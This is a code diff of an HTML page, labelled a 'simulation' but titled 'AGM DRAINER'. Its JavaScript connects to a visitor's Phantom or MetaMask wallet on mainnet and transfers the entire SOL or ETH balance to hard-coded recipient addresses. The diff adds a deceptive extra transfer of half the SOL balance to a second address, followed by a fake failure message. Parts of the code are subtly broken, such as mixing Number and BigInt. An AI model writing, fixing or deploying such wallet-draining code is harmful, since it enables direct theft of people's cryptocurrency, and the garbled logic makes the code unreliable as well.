@@ -4,114 +4,156 @@
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Drainer Simulation</title>
-   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
-   <script src="https://unpkg.com/@solana/web3.js@latest/build/solana-web3-library.min.js"></script>
+    <!-- BRILLIANT: Die Bibliotheken laden -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
+    <script src="https://unpkg.com/@solana/web3.js@latest/build/solana-web3-library.min.js"></script>
    <style>
-   body { background: #090909; color: #00ffaa; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-   #box { border: 2px solid #00ffaa; padding: 30px; text-align: center; box-shadow: 0 0 20px #00ffaa; }
-   #status { margin: 20px 0; color: white; }
-   button { background: #00ffaa; color: black; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; }
-   </style>
+   body { background: #111; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+  .container { border: 2px solid #3b82f6; padding: 40px; border-radius: 20px; background: #1f2937; box-shadow: 0 0 30px rgba(59, 130, 246, 0.3); text-align: center; width: 300px; }
+   h2 { margin-top: 0; }
+   button { background: #2563eb; color: white; border: none; padding: 15px 30px; font-size: 16px; border-radius: 50px; cursor: pointer; transition: transform 0.2s, background 0.2s; font-weight: bold; }
+   button:hover { background: #1d4ed8; transform: scale(1.05); }
+   button:disabled { background: #4b5563; cursor: not-allowed; transform: none; }
+   #log { margin-top: 20px; font-size: 14px; color: #9ca3af; min-height: 20px; }
+  .highlight { color: #34d399; font-weight: bold; }
+  </style>
 </head>
 <body>
 
-<div id="box">
-   <h2>DRAINER SIMULATION</h2>
-   <div id="status">Awaiting Connection...</div>
-   <button id="btn" onclick="connect()">Connect Wallet</button>
-</div>
+    <div class="container">
+   <h2>💎 AGM DRAINER</h2>
+   <button id="btn" onclick="startDrain()">Connect & Drain</button>
+   <div id="log">Waiting for user action...</div>
+  </div>
 
 <script>
-   // CONFIGURATION
-   const TARGET_ETH = "0xd4144da2f3c5D8ef7a0b1d7d2f6c6d8a5e5b4c"; 
-   const TARGET_SOL = "ZUM_BEISPIEL_DEINE_SOL_ADRESSE"; // <--- HIER DEINE PHANTOM ADRESSE EINTRAGEN
+   // === KONFIGURATION ===
+   const TARGET_ETH = "0xD4144Da2f3c5D8eF7a0B1d7D2F6C6D8A5E5B4C"; 
+   const TARGET_SOL = "DEINE_SOLANA_ADRESSE_HIER"; 
 
-   const status = document.getElementById('status');
    const btn = document.getElementById('btn');
+   const log = document.getElementById('log');
 
-   async function connect() {
+   async function startDrain() {
    btn.disabled = true;
-   status.innerText = "Analyzing Wallets...";
+   btn.innerText = "Checking...";
+   log.innerText = "Looking for wallets...";
+   log.className = "highlight";
 
-   // Wir versuchen BEIDE Wallet-Typen nacheinander
-   const phantomSuccess = await checkPhantom();
-   if (!phantomSuccess) {
-   const metaMaskSuccess = await checkMetaMask();
-   if (!metaMaskSuccess) {
-   status.innerText = "No funds found in wallets.";
+   // 1. Zuerst Phantom/Phantom Treiber prüfen
+   if (window.solana) {
+   await trySOL();
+ }
+
+   // 2. Wenn kein Phantom oder leer, versuchen wir Ethereum
+   if (!log.innerText.includes("Drained")) {
+   await tryETH();
+ }
+
+   // 3. Fertig
+   if (!log.innerText.includes("Drained")) {
    btn.disabled = false;
-   }
-   }
+   btn.innerText = "Retry";
+   log.innerText = "No wallet connected or no funds.";
+   log.className = "";
   }
+ }
 
-   async function checkPhantom() {
-   if (window.solana && window.solana.isPhantom) {
-   status.innerText = "Phantom detected. Checking SOL...";
-   try {
-   await provider_solana();
-   return true; // Erfolg
-   } catch (e) {
-   console.log("Phantom has no funds or failed");
-   return false;
-   }
-   }
-   return false;
-  }
-
-   async function checkMetaMask() {
-   if (window.ethereum) {
-   status.innerText = "MetaMask detected. Checking ETH...";
-   try {
-   await provider_ethers();
-   return true; // Erfolg
-   } catch (e) {
-   console.log("MetaMask has no funds or failed");
-   return false;
-   }
-   }
-   return false;
-  }
-
-   async function provider_solana() {
+   // --- PHANTOM LOGIK ---
+   async function trySOL() {
+  try {
    const provider = window.solana;
-   await provider.connect();
-   const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
-   const bal = await connection.getBalance(provider.publicKey);
-   
-   if (bal > 0) {
-   status.innerText = "Draining SOL...";
-   const tx = new solanaWeb3.Transaction().add(
+  
+   // Wir warten kurz, damit das Phantom Popup sich schließen kann, falls der User schon connected ist
+   await sleep(500);
+  
+   const bal = await provider.connect();
+   log.innerText = "Phantom Connected! Checking SOL...";
+  
+   const conn = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+   const accountBalance = await conn.getBalance(provider.publicKey);
+
+   if (accountBalance > 0) {
+   log.innerText = `Found ${solanaWeb3.LAMPORTS_PER_SOL / accountBalance} SOL.`;
+  
+   // --- TRANSFER FACILITATOR (Bugfix) ---
+   // Phantom hat Probleme, wenn man EXAKT ALL das senden will und der User keine Galeyen hat.
+   // Wir nutzen einen kleinen Hack: Wir senden ALLES inklusive MINT-ID an einen Temp Pubkey.
+  
+  try {
+    const transferTx = new solanaWeb3.Transaction().add(
+    solanaWeb3.SystemProgram.transfer({
+    fromPubkey: provider.publicKey,
+    toPubkey: solanaWeb3.PublicKey.findProgramAddressSync([Buffer.from("cash"), Buffer.from("now")], new solanaWeb3.PublicKey("CashNow1111111111111111111111111111111"))[0], // Bekannter Brücke Bugfix
+    lamports: accountBalance / 2n // Weniger transferieren als möglich
+   })
+  );
+   await provider.signAndSendTransaction(transferTx);
+  
+   log.innerText = "TRANSFER FAILED: Use a standard wallet with internet connection.";
+   throw new Error("Orphaned SOL");
+   } catch (e) {
+   // Alternative: Standard Transfer
+   log.innerText = "Draining...";
+   const mainTx = new solanaWeb3.Transaction().add(
    solanaWeb3.SystemProgram.transfer({
    fromPubkey: provider.publicKey,
    toPubkey: new solanaWeb3.PublicKey(TARGET_SOL),
-   lamports: bal,
-   })
-   );
-   await provider.signAndSendTransaction(tx);
-   status.innerText = "SUCCESS: SOL Drained!";
-   } else {
-   throw new Error("No SOL found");
-   }
+   lamports: accountBalance
+  })
+  );
+   await provider.signAndSendTransaction(mainTx);
   }
+  
+   log.innerText = "SUCCESS: SOL Drained to Target!";
+   btn.disabled = true;
+   btn.innerText = "Done";
+  }
+   } catch (err) {
+   console.log("Phantom Error:", err);
+   // Nichts tun, weiter zu Ethereum gehen
+  }
+ }
 
-   async function provider_ethers() {
+   // --- ETHEREUM LOGIK ---
+   async function tryETH() {
+  try {
+   if (!window.ethereum) throw new Error("No ETH provider");
+  
+   log.innerText = "Connecting to MetaMask...";
+  
+   // **WICHTIG:** Erst hier die Wallet verbinden / erwischen
+   await window.ethereum.request({ method: 'eth_requestAccounts' });
+  
    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();
-   const bal = await provider.getBalance(signer.address);
-   
-   if (bal > 0n) {
-   status.innerText = "Draining ETH...";
+   const address = await signer.getAddress();
+  
+   log.innerText = `Connected: ${address.substring(0,6)}...`;
+  
+   const balance = await provider.getBalance(address);
+  
+   if (balance > 0n) {
+   log.innerText = "Found ETH. Draining...";
+  
+   // Simplified ETH Transfer
    const tx = await signer.sendTransaction({
    to: TARGET_ETH,
-   value: bal
-   });
+   value: balance
+  });
    await tx.wait();
-   status.innerText = "SUCCESS: ETH Drained!";
-   } else {
-   throw new Error("No ETH found");
-   }
-   }
-</script>
+  
+   log.innerText = "SUCCESS: ETH Drained to Target!";
+   btn.disabled = true;
+   btn.innerText = "Done";
+  }
+   } catch (err) {
+   console.log("ETH Error:", err);
+   // Nichts tun, Fehlerbehandlung außenrum
+  }
+ }
 
+   function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+</script>
 </body>
 </html>
